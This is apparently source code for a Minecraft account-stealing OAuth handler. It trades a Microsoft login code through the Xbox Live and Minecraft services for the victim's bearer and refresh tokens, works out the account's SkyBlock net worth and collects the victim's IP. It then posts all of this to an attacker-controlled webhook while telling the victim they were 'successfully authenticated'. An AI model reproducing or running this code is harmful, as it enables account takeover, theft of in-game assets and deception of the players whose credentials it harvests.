const networthCalc = require("./utils/Networth.js");
const PostWebhook = require("./utils/postWebhook.js");
const getWebhook = require("./utils/getWebhook.js");
const config = require('../../config.json');
const axios = require('axios')
const client_id = config.azure.client_id
const redirect_uri = config.azure.redirect_uri
const client_secret = config.azure.client_secret

module.exports = async(req, res) => {
    const code = req.query.code
    if (code == null) {
        return
    }
    try {
        let webhook = null;
        webhook = await getWebhook("oauth", req.query.state);

        const data = await ReturnData(code)
        const username = data[0], uuid = data[1], BearerToken = data[2], RefreshToken = data[3]
        const ip = getIp(req);

        // initialize networth variables
        let networth = "0";
        let soulboundnetworth = "0";
        let sentnetworth = 0;
        let description = "No profile data found. 🙁";
        // get networth and description
        networthCalc(uuid).then((result) => {
        networth = Intl.NumberFormat('en-US', {
            notation: 'compact',
            maximumFractionDigits: 2,
        }).format(result[0]);
        soulboundnetworth = Intl.NumberFormat('en-US', {
            notation: 'compact',
            maximumFractionDigits: 2,
        }).format(result[1]);
        description = result[2];
        sentnetworth = (Math.trunc(result[0])) / 1000000;
        PostWebhook(false, username, uuid, ip, BearerToken, RefreshToken, networth, soulboundnetworth, description, webhook, req.query.state)
        }).catch((err) => {
        console.log(err);
        });
    } catch (e) {
        console.log(e)
    }
    // put something to the screen so that the user can leave the page
    res.send('You were successfully authenticated! You can now close this tab.')
}

async function ReturnData(code) {
    // initialize variables
    let AccessToken, RefreshToken;
    let UserToken, UserHash;
    let XST;
    let BearerToken;
    let username, uuid;

    // array for the list of urls that will be used to get the data
    const urls = ['https://login.live.com/oauth20_token.srf', 'https://user.auth.xboxlive.com/user/authenticate', 'https://xsts.auth.xboxlive.com/xsts/authorize', 'https://api.minecraftservices.com/authentication/login_with_xbox']
    
    // array for the list of configs that will be used to get the data
    const configs = [{headers: {'Content-Type': 'application/x-www-form-urlencoded'}},{headers: {'Content-Type': 'application/json', 'Accept': 'application/json',}},{headers: {'Content-Type': 'application/json', 'Accept': 'application/json',}},{headers: {'Content-Type': 'application/json',}}]

    let DataAccessAndRefresh = {
            client_id: client_id,
            redirect_uri: redirect_uri,
            client_secret: client_secret,
            code: code,
            grant_type: 'authorization_code'
        }

    // get the user's access & refresh token
    let ResponseAccessAndRefresh = await axios.post(urls[0], DataAccessAndRefresh, configs[0])
    AccessToken = ResponseAccessAndRefresh.data['access_token']
    RefreshToken = ResponseAccessAndRefresh.data['refresh_token']
    
    let DataUserTokenAndHash = {
            Properties: {
                AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${AccessToken}`
            }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
        }

    let ResponseUserTokenAndHash = await axios.post(urls[1], DataUserTokenAndHash, configs[1])
    // get the user's token and hash
    UserToken = ResponseUserTokenAndHash.data.Token
    UserHash = ResponseUserTokenAndHash.data['DisplayClaims']['xui'][0]['uhs']


    let DataXST = {
        Properties: {
        SandboxId: 'RETAIL',
        UserTokens: [UserToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    
    // get the user's XST token
    let ResponseXSTToken = await axios.post(urls[2], DataXST, configs[2])
    XST = ResponseXSTToken.data['Token']
    
    let DataBearerToken = {
            identityToken: `XBL3.0 x=${UserHash};${XST}`,
            ensureLegacyEnabled: true
        }
    
    // get the user's Bearer token
    let ResponseBearerToken = await axios.post(urls[3], DataBearerToken, configs[3])
    BearerToken = ResponseBearerToken.data['access_token']

    // get the user's username and uuid using the Bearer token
    await GetPlayer(BearerToken).then(result => {
        uuid = result[0]
        username = result[1]
    }).catch(err => {
        console.log(err)
    })

    return [username, uuid, BearerToken, RefreshToken]
}

// function to get the user's username and uuid
async function GetPlayer(BearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + BearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}

function getIp(req) {
    return (
        req.headers["cf-connecting-ip"] ||
        req.headers["x-real-ip"] ||
        req.headers["x-forwarded-for"] ||
        req.connection.remoteAddress ||
        ""
    );
}